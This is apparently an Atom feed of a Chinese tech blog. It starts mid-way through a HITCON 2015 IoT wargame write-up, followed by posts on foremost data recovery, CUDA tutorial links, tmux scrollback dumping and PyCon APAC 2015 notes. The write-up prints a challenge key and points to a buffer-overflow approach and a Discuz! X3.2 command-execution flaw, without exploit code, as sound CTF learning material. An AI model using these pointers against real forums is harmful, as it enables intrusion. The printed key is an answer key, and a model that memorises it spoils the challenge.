把 &lt;code&gt;7 * 10 - 14 + 6 - 5 - 19&lt;/code&gt; 取出來後&lt;br /&gt;
丟給 &lt;a href="https://docs.python.org/2/library/functions.html#eval"&gt;eval()&lt;/a&gt; 算出結果，&lt;br /&gt;
再把值 assign 給 answer 回答。&lt;br /&gt;
(&lt;code&gt;eval()&lt;/code&gt; 可以把字串當作 expression 進行求值，雖然很方便，但真正在開發程式的時候最好不要亂用，尤其是不要把使用者輸入的資料丟給 &lt;code&gt;eval()&lt;/code&gt;，因為你永遠不知道使用者會輸入什麼奇怪的東西)&lt;br /&gt;
照著這個想法修改一下 &lt;code&gt;game2()&lt;/code&gt;，這題應該就解決了  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 273A9C1E2D380B48&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;極度建議自己寫程式碼，&lt;br /&gt;
真的真的想不出來的話再點下面的連結吧！&lt;br /&gt;
不然是不會進步的。&lt;br /&gt;
程式碼請見：&lt;a href="https://gist.github.com/M157q/164f9ba5bd8ae0b18afe"&gt;https://gist.github.com/M157q/164f9ba5bd8ae0b18afe&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;然後看到 IRC 有人提到，&lt;br /&gt;
他把 Nano 上的 binary dump 到電腦上，&lt;br /&gt;
直接用 &lt;code&gt;strings&lt;/code&gt; 拿到 3 個 key，&lt;br /&gt;
不知道怎麼做到的&lt;br /&gt;
查了一些關鍵字，會是&lt;code&gt;avr-objdump&lt;/code&gt;嗎?  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;補上直接 dump 的 write-up &lt;a href="http://kb.hitcon.org/post/128246307977/%E7%A7%92%E8%A7%A3-hitcon-nano-%E9%A1%8C"&gt;HITCON Knowledge Base — 秒解 Hitcon Nano 題&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Raspberry Pi 部份&lt;/h2&gt;
&lt;p&gt;有分四題：R0, R1, R2, R4 的題目都不同，都是由 Orange 出題。&lt;br /&gt;
我只有碰 R0 跟 R1 的題目，有些想法，但都沒解出來，以下簡單紀錄。  &lt;/p&gt;
&lt;h3&gt;R0&lt;/h3&gt;
&lt;p&gt;Web 那邊會拿到一個 &lt;a href="/files/hitcon-2015-iot-wargame/rpi/r0/forkyou"&gt;ARM64 的 binary 執行檔&lt;/a&gt;，&lt;br /&gt;
之後用 &lt;code&gt;qemu-aarch64&lt;/code&gt; 的環境就可以執行，&lt;br /&gt;
聽說還蠻簡單的，可是我還是解不出來QQ&lt;br /&gt;
似乎有在某處看到 &lt;code&gt;/bin/sh -c&lt;/code&gt; 之類的呼叫，&lt;br /&gt;
應該是利用 BOF 把 EIP 指到那邊就可以拿到 shell 了?  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;補上 R0 write-up &lt;a href="http://kb.hitcon.org/post/127947378507/hitcon-2015-iot-wargame-r0-%E6%8C%91%E6%88%B0%E9%A1%8C"&gt;HITCON Knowledge Base — HITCON 2015 IoT Wargame – R0 挑戰題&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;R1&lt;/h3&gt;
&lt;p&gt;連進去是 Discuz! X3.2&lt;br /&gt;
查了一下，有 remote shell execute 漏洞:&lt;br /&gt;
&lt;a href="http://drops.wooyun.org/papers/4611"&gt;DiscuzX系列命令执行分析公开（三连弹） | WooYun知识库&lt;/a&gt;&lt;br /&gt;
照著做之後，&lt;br /&gt;
找不到在 &lt;code&gt;data/attachment&lt;/code&gt; 底下符合權限的圖片來編輯，&lt;br /&gt;
(最近重灌，還沒裝 DirBuster 或是 Burp Suite，所以沒暴力掃底下有哪些東西...)&lt;br /&gt;
無法觸發 picwidth 的 Remote Shell Excution 漏洞，&lt;br /&gt;
感覺方向應該是對的吧？&lt;br /&gt;
這題是四題裏面沒被人解出來的。&lt;br /&gt;
(GeoHot 把其他三題都解掉了...)  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;這次的 Wargame 大概就是這樣吧，&lt;br /&gt;
果然實力還是不夠，&lt;br /&gt;
HST 的 Wargame 拿到 reversed.txt 裡頭一串 ...---.. 後也沒啥想法。  &lt;/p&gt;
&lt;p&gt;會把 Nano 的部份寫的這麼詳細的原因，&lt;br /&gt;
是因為想要推廣大家玩一下 Wargame 吧！&lt;br /&gt;
(覺得有趣的話就可以來打 CTF 了)&lt;br /&gt;
畢竟上面也講了，這次 Wargame 真的不算難，&lt;br /&gt;
而將近 1000 人的會眾，只有不到 300 人註冊，只有 161 人有拿到分，&lt;br /&gt;
這比例實在有點少。&lt;br /&gt;
再加上幾天前在 Facebook 上看到有人說 Nano 一片一片燒，燒到手快斷了，&lt;br /&gt;
覺得這麼少人玩實在有點可惜。  &lt;/p&gt;
&lt;p&gt;處理好 Arduino Nano 跟電腦連接之後，&lt;br /&gt;
基本上就是寫 Python Code，&lt;br /&gt;
所以我才戲稱是 Python Wargame，&lt;br /&gt;
但其實沒學過 Python 的人藉著這個機會學一下 Python 也不錯，&lt;br /&gt;
畢竟因為 Python 的方便性，很多 exploit 都用 Python 寫了。  &lt;/p&gt;
&lt;p&gt;總之，這篇就是一個小廢物的流水帳。&lt;br /&gt;
有問題歡迎留言討論，但我不一定會就是T_T。  &lt;/p&gt;</summary><category term="CTF"></category><category term="HITCON"></category><category term="Arduino"></category><category term="Python"></category><category term="Raspberry Pi"></category><category term="Write-up"></category><category term="Conf"></category></entry><entry><title>Data recovery by using foremost</title><link href="https://blog.m157q.tw/posts/2015/08/25/data-recovery-by-using-foremost/" rel="alternate"></link><published>2015-08-26T15:58:58+08:00</published><updated>2015-08-26T15:58:58+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-08-25:posts/2015/08/25/data-recovery-by-using-foremost/</id><summary type="html">&lt;h3&gt;溫馨小提醒&lt;/h3&gt;
&lt;p&gt;要把所有 *.JPG 轉成 *.jpg 的情況下&lt;br /&gt;
如果有 &lt;code&gt;rename&lt;/code&gt; 的話，可以這樣用 &lt;code&gt;rename "s/JPG/jpg/" *.JPG&lt;/code&gt;&lt;br /&gt;
如果沒有的話，我是這樣用 &lt;code&gt;find | grep .JPG | xargs -I {}.JPG mv {}.JPG {}.jpg&lt;/code&gt;&lt;br /&gt;
然後就悲劇了，因為如果以 .JPG 結尾的檔案有空白或啥其他特殊的符號的話，就會出現恐怖的意外&lt;br /&gt;
所以改成 &lt;code&gt;find | grep .JPG | xargs -I {}.JPG mv "{}.JPG" "{}.jpg"&lt;/code&gt; 才能避免悲劇發生&lt;br /&gt;
(應該吧?有錯請指正)  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;其實可以省略 grep  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;find -type f -name "*.JPG" | xargs -I {}.JPG mv "{}.JPG" "{}.jpg"&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;資料救援之路 with foremost&lt;/h3&gt;
&lt;p&gt;搜尋了一下相關資料&lt;br /&gt;
找到了 &lt;a href="https://wiki.archlinux.org/index.php/File_recovery"&gt;File recovery - ArchWiki&lt;/a&gt; 和 &lt;a href="https://help.ubuntu.com/community/DataRecovery"&gt;DataRecovery - Community Help Wiki&lt;/a&gt;&lt;br /&gt;
一開始是裝了 &lt;a href="http://extundelete.sourceforge.net/"&gt;extundelete&lt;/a&gt;&lt;br /&gt;
裝完以後才想到這顆外接硬碟是 NTFS 不是 ext4&lt;br /&gt;
所以看到底下的 &lt;a href="http://foremost.sourceforge.net/"&gt;Foremost&lt;/a&gt;&lt;br /&gt;
在 &lt;a href="https://help.ubuntu.com/community/DataRecovery"&gt;DataRecovery - Community Help Wiki&lt;/a&gt; 裡頭寫著支援 fat, ext3 和 NTFS&lt;br /&gt;
所以才想裝來試試看  &lt;/p&gt;
&lt;p&gt;Arch Linux Official Package 裡頭有&lt;br /&gt;
所以直接 &lt;code&gt;sudo pacman -S foremost&lt;/code&gt; 就能安裝了&lt;br /&gt;
使用方法也沒有很難  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus.  
$ foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &amp;lt;type&amp;gt;] [-s &amp;lt;blocks&amp;gt;] [-k &amp;lt;size&amp;gt;]  
    [-b &amp;lt;size&amp;gt;] [-c &amp;lt;file&amp;gt;] [-o &amp;lt;dir&amp;gt;] [-i &amp;lt;file]  

-V  - display copyright information and exit  
-t  - specify file type.  (-t jpeg,pdf ...)  
-d  - turn on indirect block detection (for UNIX file-systems)  
-i  - specify input file (default is stdin)  
-a  - Write all headers, perform no error detection (corrupted files)  
-w  - Only write the audit file, do not write any detected files to the disk  
-o  - set output directory (defaults to output)  
-c  - set configuration file to use (defaults to foremost.conf)  
-q  - enables quick mode. Search are performed on 512 byte boundaries.  
-Q  - enables quiet mode. Suppress output messages.  
-v  - verbose mode. Logs all messages to screen  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用前先把外接硬碟 &lt;code&gt;umount&lt;/code&gt; 後&lt;br /&gt;
再 &lt;code&gt;foremost -t jpg -i /dev/sdb1 -o /recovery&lt;/code&gt;&lt;br /&gt;
這是我這次的使用情況: 把 sdb1 中的 .jpg 檔案還原到 /recovery 這個資料夾中&lt;br /&gt;
比較詳細一點的範例可以參考 &lt;a href="https://help.ubuntu.com/community/DataRecovery#Foremost"&gt;https://help.ubuntu.com/community/DataRecovery#Foremost&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;另外在 &lt;a href="https://wiki.archlinux.org/index.php/File_recovery#Foremost"&gt;https://wiki.archlinux.org/index.php/File_recovery#Foremost&lt;/a&gt; 也有寫到&lt;br /&gt;
&lt;code&gt;foremost&lt;/code&gt; 會根據檔案的 headers, footers 以及內部的資料結構來進行檔案的回復&lt;br /&gt;
可以裝在 Live USB 上使用當作救援USB，也可以直接安裝來使用&lt;br /&gt;
並且可以透過 config file (&lt;code&gt;/etc/foremost.conf&lt;/code&gt;)來決定要回復哪些類型的檔案&lt;br /&gt;
內建也有提供檔案類型可供選擇：&lt;br /&gt;
jpg, gif, png, bmp, avi, exe, mpg, wav, riff, wmv, mov, pdf, ole, doc, zip, rar, htm, cpp  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果沒有用 -t 指定檔案類型的話，預設就是回復所有檔案  &lt;/li&gt;
&lt;li&gt;-i 則是接要救援的東西(預設是 stdin，可以是單檔、磁區或是映像檔)  &lt;/li&gt;
&lt;li&gt;-o 就接要把復原的檔案放到哪裡  &lt;/li&gt;
&lt;li&gt;-v 的話可以把 log print 到 stdout  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;總之用法大概就是這樣&lt;br /&gt;
對了 要注意一下 -o 參數接的目標位置的容量夠不夠大，不夠大的話可能會悲劇(?)  &lt;/p&gt;
&lt;h3&gt;結果&lt;/h3&gt;
&lt;p&gt;程式大概執行了兩個半小時左右&lt;br /&gt;
總共回復了 24,481 個 jpg 檔&lt;br /&gt;
大小約 11G 左右&lt;br /&gt;
只有稍微看一下，但的確都是消失的檔案沒錯&lt;br /&gt;
之後應該就是慢慢將檔案重新分類就是  &lt;/p&gt;
&lt;h3&gt;結論&lt;/h3&gt;
&lt;p&gt;第一次自己搞檔案救援，還好沒把外接硬碟弄掛，不然我一定會哭死&lt;br /&gt;
畢竟這台外接硬碟也有點年紀了，大概也用了6年左右，很怕他哪天突然壞軌掛掉&lt;br /&gt;
然後 &lt;code&gt;extundelete&lt;/code&gt; 我還沒試過，只是剛好看到順便提一下&lt;br /&gt;
至於 &lt;code&gt;foremost&lt;/code&gt;，在 &lt;a href="https://github.com/korczis/foremost"&gt;https://github.com/korczis/foremost&lt;/a&gt; 有原始碼，&lt;br /&gt;
稍微瞄過了一下，覺得程式碼寫的蠻乾淨的，有空的時候想去理解一下裏面程式碼怎麼寫的&lt;br /&gt;
然後 README 裏面寫到  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Foremost was written by Special Agent Kris Kendall and Special Agent Jesse  
Kornblum of the United States Air Force Office of Special Investigations  
starting in March 2001.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;恩 沒錯 是美國空軍特別調查辦公室(AFOSI)的兩位特務(Special Agent)寫的&lt;br /&gt;
不愧是美國政府出品 真的蠻猛的 而且還是距今十幾年的 project&lt;br /&gt;
(真不知道我自己現在寫的這些程式 十多年後還能不能正常運作)&lt;br /&gt;
老實說我本來真的對回復這些檔案不抱任何期待&lt;br /&gt;
畢竟有點 UNIX-like system 使用經驗的人大概都知道 rm 跟 mv 不要亂下&lt;br /&gt;
下了就別抱太大的期待能救回來了，畢竟這不是丟到垃圾桶而已&lt;br /&gt;
但 foremost 真的幫我把圖片救回來了...&lt;br /&gt;
所以寫個文章紀錄一下這個好東西&lt;br /&gt;
(只是不知道 24,881 個圖片我要手動分類多久Orz)  &lt;/p&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/korczis/foremost"&gt;https://github.com/korczis/foremost&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://help.ubuntu.com/community/DataRecovery"&gt;https://help.ubuntu.com/community/DataRecovery&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/File_recovery"&gt;https://wiki.archlinux.org/index.php/File_recovery&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Foremost"&gt;https://wiki.archlinux.org/index.php/Foremost&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://foremost.sourceforge.net/"&gt;http://foremost.sourceforge.net/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Data Recovery"></category><category term="foremost"></category><category term="Life"></category></entry><entry><title>Nice Series of CUDA Tutorials on ptt.cc</title><link href="https://blog.m157q.tw/posts/2015/08/15/nice-series-of-cuda-tutorials-on-ptt-cc/" rel="alternate"></link><published>2015-10-26T14:04:00+08:00</published><updated>2015-10-26T14:04:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-08-15:posts/2015/08/15/nice-series-of-cuda-tutorials-on-ptt-cc/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1222302747.A.CC4.html"&gt;[分享] CUDA 程式設計(1) -- 簡介 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1222881899.A.C62.html"&gt;[分享] CUDA 程式設計(2) -- SIMT概觀 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1223477316.A.1F8.html"&gt;[分享] CUDA 程式設計(3) -- CUDA 安裝 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1223477872.A.1C2.html"&gt;[分享] CUDA 程式設計(4) -- 硬體規格簡介 &amp;amp; 採購參考 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1224074823.A.786.html"&gt;[分享] CUDA 程式設計(5) -- 第一支程式 (向量加法) - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1224674233.A.4CC.html"&gt;[分享] CUDA 程式設計(6) -- 記憶體 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1225285229.A.F15.html"&gt;[分享] CUDA 程式設計(7) -- 來玩泡泡吧 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1225888236.A.79A.html"&gt;[分享] CUDA 程式設計(8) -- OpenMP vs. SIMT - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1225912100.A.5B0.html"&gt;[分享] CUDA 程式設計(9) -- 泡泡龍 part 2 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1226501606.A.7E2.html"&gt;[分享] CUDA 程式設計(10) -- 速成篇(上) - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1227118854.A.0F1.html"&gt;[分享] CUDA 程式設計(11) -- 速成篇(中) - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1227708086.A.351.html"&gt;[分享] CUDA 程式設計(12) -- 速成篇(下) - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1228930736.A.779.html"&gt;[分享] CUDA 程式設計(13) -- 材質快取 (一) - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1231036765.A.649.html"&gt;[分享] CUDA 程式設計(14) -- 新年來開始 warp 吧 - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/VideoCard/M.1233304220.A.98D.html"&gt;[分享] CUDA 程式設計(15) -- 翻譯 RWT P4 [CUDA API] - 看板 VideoCard - 批踢踢實業坊&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CUDA"></category><category term="GPU"></category><category term="Tutorial"></category></entry><entry><title>Save Content of tmux/screen Scrollback Into A File</title><link href="https://blog.m157q.tw/posts/2015/07/27/save-content-of-tmux-or-screen-scrollback-into-a-file/" rel="alternate"></link><published>2016-09-12T00:24:00+08:00</published><updated>2016-09-12T00:24:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-07-27:posts/2015/07/27/save-content-of-tmux-or-screen-scrollback-into-a-file/</id><summary type="html">&lt;p&gt;因為某些原因，&lt;br /&gt;
想要把 tmux copy mode 裡面的內容 dump 出來。&lt;br /&gt;
但因為之前沒試過，不知道該如何做，所以去查了一下，&lt;br /&gt;
以下整理簡單步驟：  &lt;/p&gt;
&lt;h2&gt;tmux&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;將指定的行數 (&lt;code&gt;$linenum&lt;/code&gt;) 存到 buffer 中，進入 copy mode 後，即可在右上角看到行數。  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:capture-pane -S -$linenum  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;將剛剛存到 buffer 中的內容，儲存到指定的檔案路徑 (&lt;code&gt;$filepath&lt;/code&gt;)  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:save-buffer $filepath  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;刪除 buffer 中的內容 (optional)  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:delete-buffer  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;$filepath&lt;/code&gt; 檔案中應該就是 dump 出來的內容  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;screen&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;screen&lt;/code&gt; 的話，目前看到的相似用法是  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:hardcopy -h $filepath  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;但這個用法只能儲存全部的內容，無法選擇行數。  &lt;/p&gt;
&lt;p&gt;然後我在 screen 版本 4.04.00 (GNU) 19-Jun-16 使用時，&lt;br /&gt;
如果內容裏面有中文的話，&lt;br /&gt;
dump 出來以後中文會變成亂碼。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://unix.stackexchange.com/questions/26548/write-all-tmux-scrollback-to-a-file"&gt;Write all tmux scrollback to a file - Unix &amp;amp; Linux Stack Exchange&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/4807474/copying-gnu-screen-scrollback-buffer-to-file-extended-hardcopy"&gt;Copying GNU screen scrollback buffer to file (extended hardcopy)? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="tmux"></category><category term="screen"></category></entry><entry><title>PyCon APAC 2015 Notes and Thoughts</title><link href="https://blog.m157q.tw/posts/2015/07/26/pycon-apac-2015-notes-and-thoughts/" rel="alternate"></link><published>2015-07-26T15:25:54+08:00</published><updated>2015-07-26T15:25:54+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-07-26:posts/2015/07/26/pycon-apac-2015-notes-and-thoughts/</id><summary type="html">&lt;p&gt;這次是第二次參加 PyCon，&lt;br /&gt;
與其像去年當個沒做事的 Web 組冗員，&lt;br /&gt;
還是乖乖當個會眾就好，&lt;br /&gt;
但還是有義務幫忙一些簡單的小事啦。  &lt;/p&gt;
&lt;p&gt;相較於上次參加，&lt;br /&gt;
這一年中也對 Python 更加瞭解了一些，&lt;br /&gt;
但仍然有很多地方不足，&lt;br /&gt;
但至少今年的議程中，&lt;br /&gt;
能夠聽懂的議程比較多了。  &lt;/p&gt;
&lt;p&gt;今年的議程中，&lt;br /&gt;
感覺偏硬的講題變多了，&lt;br /&gt;
似乎是件好事，&lt;br /&gt;
不然很多人提到 Python 都覺得只有 Django, Flask, Bottle, Tornado, ... 之類的 Web 應用&lt;br /&gt;
或是 Numpy, Scipy 之類的科學運算。&lt;br /&gt;
其實 Security 的部分也越來越常看見 exploit 是用 Python 寫的，&lt;br /&gt;
只是可能比較難在 PyCon 出現吧，&lt;br /&gt;
應該都出現在 HITCON。&lt;br /&gt;
但今年的講題真的是比去年還富有多樣性就是。  &lt;/p&gt;
&lt;p&gt;而今年印象最深刻的議程是 Scott Tsai 講 GDB 掛 Python hook 做 Debug 那場，&lt;br /&gt;
講者的英文在我耳裡聽起來跟 native speaker 一樣， 非常流利。&lt;br /&gt;
現場直接 Live Demo 也非常嫻熟，真的很厲害。  &lt;/p&gt;
&lt;p&gt;除了議程之外，最讓我印象深刻的絕對是第二天晚上的夜市。  &lt;/p&gt;
&lt;p&gt;晚餐的自助吧菜色非常多，可以吃得很飽。&lt;br /&gt;
再加上很棒的管樂隊演奏（宇宙戰艦大和號、龍貓、...），&lt;br /&gt;
還有其他的音樂表演，然後各個攤位自己舉辦的各種活動。  &lt;/p&gt;
&lt;p&gt;因為一開始就被拉去 Code Fight 的攤位，&lt;br /&gt;
然後跟 dv 被抓去當第一題的白老鼠，還被拍了照，&lt;br /&gt;
然後就一直待在那邊玩，所以印象最深的也只有 Code Fight。&lt;br /&gt;
結果我跟 dv 很糗的第一題都沒在時間內解出來，還在那邊耗很久的時間，&lt;br /&gt;
用別人的電腦真的很不習慣啊！&lt;br /&gt;
好吧，其實只是太廢的藉口，回去得多練練功。&lt;br /&gt;
但這活動真的很有趣，一堆工程師宅宅在現場解題目，玩得不亦樂乎，希望明年還會有。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="code fight" src="/files/pycon-apac-2015-notes-and-thoughts/code-fight.jpg" /&gt;&lt;br /&gt;
source: &lt;a href="https://www.facebook.com/photo.php?fbid=10206661768324121&amp;amp;set=a.1209323314476.2032355.1270526425&amp;amp;type=1"&gt;https://www.facebook.com/photo.php?fbid=10206661768324121&amp;amp;set=a.1209323314476.2032355.1270526425&amp;amp;type=1&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;附上 Code Fight 的 GitHub Repo (有興趣的人可以去貢獻題目XD)  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/ccwang002/pyapac_code_fighter"&gt;ccwang002/pyapac_code_fighter · GitHub&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Badge System &amp;amp; Bingo 令我印象深刻的程度僅次於 Night Party。  &lt;/p&gt;
&lt;p&gt;由於今年的 Badge 是 RFID card，&lt;br /&gt;
在各個廠商攤位以及會議室的門口都有 RPi 做好的 RFID Reader，&lt;br /&gt;
會眾到贊助廠商的攤位可以 Check-in，&lt;br /&gt;
一方面是讓廠商得到你的 email，之後可以寄送一些廣告或者是徵才訊息給你，&lt;br /&gt;
另一方面是官方做了一個&lt;a href="http://www.codeme.cc/pycon/badges/?kktix=2015"&gt;Badge System&lt;/a&gt;，&lt;br /&gt;
每個廠商的攤位 Check-in 都會有成就可以解鎖，&lt;br /&gt;
而每場議程也都可以 Check-in，&lt;br /&gt;
然後根據解鎖的成就數量，會影響到最後一天 Bingo 活動起始的格子數。  &lt;/p&gt;
&lt;p&gt;因為我解鎖了不少成就，&lt;br /&gt;
所以在最後一天的 Bingo 活動中幸運的得到了 PyCarm 一年份的序號，&lt;br /&gt;
雖然平常還是都在用 Vim 就是。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="pycharm" src="/files/pycon-apac-2015-notes-and-thoughts/pycharm.jpg" /&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;順帶一提，PyCharm 攤位送的贈品是溜溜球，讓人有種回味童年的感覺  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;PyCon 真的每年都有不一樣的東西，&lt;br /&gt;
除了上面提到的 Night Party 跟 Bingo 以外，&lt;br /&gt;
其實會場的佈置也很棒，&lt;br /&gt;
現場有一個超級長的橫向時間軸海報，&lt;br /&gt;
上面記錄了跟 Python 相關的許多重大事件，&lt;br /&gt;
然後附上便利貼和筆，讓會眾可以在海報上面留言，&lt;br /&gt;
我只有拍下 PyCon 2015 的部分。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="poster" src="/files/pycon-apac-2015-notes-and-thoughts/poster.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;然後還有今年的穿梭時空的飛車的看板，&lt;br /&gt;
可以給人拍照用XD  &lt;/p&gt;
&lt;p&gt;&lt;img alt="signboard" src="/files/pycon-apac-2015-notes-and-thoughts/signboard.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;還有餐點也真的很棒  &lt;/p&gt;
&lt;p&gt;&lt;img alt="meal" src="/files/pycon-apac-2015-notes-and-thoughts/meal.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;因為工作人員幾乎都是上班族，&lt;br /&gt;
所以都是用下班或是假日的時間義務幫忙，&lt;br /&gt;
真的很感謝他們辛苦的籌備！  &lt;/p&gt;
&lt;p&gt;喔 對了 因為今年 irc channel 真的是有夠冷清&lt;br /&gt;
所以官方開了個 gitter 代替 irc 的聊天功能&lt;br /&gt;
想看聊天記錄的人可以去看看&lt;br /&gt;
&lt;a href="https://gitter.im/pycontw/pyconapac2015"&gt;https://gitter.im/pycontw/pyconapac2015&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;心得就是上面的部分啦&lt;br /&gt;
以下是三天議程中我自己紀錄的筆記，附上 Hackpad 共筆連結：  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Date: 2015/06/05 - 2015/06/07&lt;br /&gt;
&lt;a href="https://hackpad.com/Slides-of-PyCon-APAC-2015-xyLGxKpDgwP"&gt;Slides of PyCon APAC 2015 - hackpad.com&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Day 1 - 2015/06/05 - Fri&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://hackpad.com/PyCon-APAC-2015-Day-1-June-5-Tt8wwkILDX0"&gt;PyCon APAC 2015 - Day 1 (June 5) - hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;Ecosystem Threats to Python - Van Lindberg&lt;/h4&gt;
&lt;p&gt;Python is 25 years old.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The Python Ecosystem  &lt;ul&gt;
&lt;li&gt;2014 - Ranking of the programing language, took from stackoverflow, github  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Perl vs Python - from 2004 - 2013  &lt;ul&gt;
&lt;li&gt;Perl down, Python up.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;The transistion from Python2 to Python3  &lt;/li&gt;
&lt;li&gt;Threats  &lt;ul&gt;
&lt;li&gt;Java  &lt;/li&gt;
&lt;li&gt;nodejs  &lt;/li&gt;
&lt;li&gt;go  &lt;/li&gt;
&lt;/ul&gt;
